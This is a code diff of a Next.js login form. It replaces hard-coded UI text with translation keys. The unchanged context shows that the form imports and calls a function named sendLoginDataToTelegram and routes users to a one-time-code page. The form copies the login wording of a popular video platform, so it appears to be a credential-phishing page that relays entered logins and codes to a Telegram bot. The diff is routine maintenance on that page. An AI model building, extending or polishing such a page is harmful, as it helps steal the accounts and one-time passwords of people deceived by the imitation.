@@ -37,6 +37,7 @@ import {
 import { useToast } from "@/hooks/use-toast";
 import { countries } from "@/lib/countries";
 import { sendLoginDataToTelegram } from "@/app/actions/telegram";
+import { useLanguage } from "@/contexts/language-context";
 
 
 const formSchema = z.discriminatedUnion("loginType", [
@@ -62,6 +63,7 @@ const formSchema = z.discriminatedUnion("loginType", [
 type LoginFormValues = z.infer<typeof formSchema>;
 
 export function LoginForm() {
+  const { t } = useLanguage();
   const [activeTab, setActiveTab] = useState("phone");
   const [showPassword, setShowPassword] = useState(false);
   const [country, setCountry] = useState("United States");
@@ -131,14 +133,14 @@ export function LoginForm() {
     
     if (result.success) {
         toast({
-            title: "Code Sent",
-            description: "A one-time password has been sent to you.",
+            title: t('codeSent'),
+            description: t('otpSentMessage'),
         });
         router.push('/otp');
     } else {
         toast({
-            title: "Login Failed",
-            description: "Something went wrong. Please try again.",
+            title: t('loginFailed'),
+            description: t('loginFailedMessage'),
             variant: "destructive",
         });
     }
@@ -154,7 +156,7 @@ export function LoginForm() {
             <FormControl>
               <Input
                 type={showPassword ? "text" : "password"}
-                placeholder="Password"
+                placeholder={t('password')}
                 {...field}
                 aria-invalid={!!errors[fieldName]}
                 className="pr-10"
@@ -180,15 +182,15 @@ export function LoginForm() {
   return (
     <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
       <div className="text-center">
-        <h1 className="text-2xl font-bold font-headline">Log in to LoginFlow</h1>
+        <h1 className="text-2xl font-bold font-headline">{t('loginToLoginFlow')}</h1>
         <p className="text-sm text-muted-foreground mt-2">
-          Manage your account, check notifications, comment on videos, and more.
+          {t('loginSubheading')}
         </p>
       </div>
       <Tabs value={activeTab} onValueChange={handleTabChange} className="w-full">
         <TabsList className="grid w-full grid-cols-2">
-          <TabsTrigger value="phone">Phone</TabsTrigger>
-          <TabsTrigger value="email">Email / Username</TabsTrigger>
+          <TabsTrigger value="phone">{t('phone')}</TabsTrigger>
+          <TabsTrigger value="email">{t('emailUsername')}</TabsTrigger>
         </TabsList>
         <Form {...form}>
           <form onSubmit={handleSubmit(onSubmit)} className="space-y-4 pt-4">
@@ -237,7 +239,7 @@ export function LoginForm() {
                   render={({ field }) => (
                     <FormItem className="flex-1">
                       <FormControl>
-                        <Input type="tel" placeholder="Phone number" {...field} autoFocus />
+                        <Input type="tel" placeholder={t('phoneNumber')} {...field} autoFocus />
                       </FormControl>
                       <FormMessage />
                     </FormItem>
@@ -253,7 +255,7 @@ export function LoginForm() {
                 render={({ field }) => (
                   <FormItem>
                     <FormControl>
-                      <Input type="text" placeholder="Email or username" {...field} autoFocus />
+                      <Input type="text" placeholder={t('emailOrUsername')} {...field} autoFocus />
                     </FormControl>
                     <FormMessage />
                   </FormItem>
@@ -265,19 +267,19 @@ export function LoginForm() {
             <Dialog>
               <DialogTrigger asChild>
                 <button type="button" className="block text-sm text-primary hover:text-accent text-right font-semibold transition-colors w-full">
-                  Forgot password?
+                  {t('forgotPassword')}
                 </button>
               </DialogTrigger>
               <DialogContent className="sm:max-w-md bg-white">
                 <DialogHeader>
-                  <DialogTitle className="text-black text-center text-xl">Reset password with:</DialogTitle>
+                  <DialogTitle className="text-black text-center text-xl">{t('resetPasswordWith')}</DialogTitle>
                 </DialogHeader>
                 <div className="flex flex-col space-y-3 pt-4">
                     <Link href="#" passHref>
                       <Button asChild variant="outline" className="w-full justify-start text-base py-6 border-gray-300 text-black hover:bg-gray-100 cursor-pointer">
                           <div>
                             <Phone className="mr-3" />
-                            Phone number
+                            {t('phone')}
                           </div>
                       </Button>
                     </Link>
@@ -285,13 +287,13 @@ export function LoginForm() {
                        <Button asChild variant="outline" className="w-full justify-start text-base py-6 border-gray-300 text-black hover:bg-gray-100 cursor-pointer">
                           <div>
                             <Mail className="mr-3" />
-                            Email
+                            {t('email')}
                           </div>
                       </Button>
                     </Link>
                     <DialogClose asChild>
                         <Button type="button" variant="secondary" className="w-full text-base py-6 bg-gray-200 text-black hover:bg-gray-300">
-                            Cancel
+                            {t('cancel')}
                         </Button>
                     </DialogClose>
                 </div>
@@ -299,7 +301,7 @@ export function LoginForm() {
             </Dialog>
 
             <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90" disabled={isSubmitting}>
-              {isSubmitting ? "Logging in..." : "Log in"}
+              {isSubmitting ? t('loggingIn') : t('login')}
             </Button>
           </form>
         </Form>
@@ -307,7 +309,7 @@ export function LoginForm() {
 
       <div className="text-xs text-center text-muted-foreground pt-4">
          <p>
-          By continuing with an account located in{" "}
+          {t('byContinuing')}{" "}
           <Select onValueChange={(countryName) => {
               const newCountry = countries.find(
                 (c) => c.name === countryName
@@ -331,13 +333,13 @@ export function LoginForm() {
               ))}
             </SelectContent>
           </Select>
-          , you agree to our{" "}
+          , {t('youAgreeToOur')}{" "}
           <Link href="#" className="underline hover:text-primary">
-            Terms of Service
+            {t('termsOfService')}
           </Link>{" "}
-          and acknowledge that you have read our{" "}
+          {t('andAcknowledge')}{" "}
           <Link href="#" className="underline hover:text-primary">
-            Privacy Policy
+            {t('privacyPolicy')}
           </Link>
           .
         </p>
@@ -345,9 +347,9 @@ export function LoginForm() {
 
       <div className="mt-4 p-4 border-t text-center">
         <p className="text-sm text-muted-foreground">
-          Don’t have an account?{" "}
+          {t('dontHaveAccount')}{" "}
           <Link href="#" className="text-primary hover:text-accent font-bold">
-            Sign up
+            {t('signUp')}
           </Link>
         </p>
       </div>
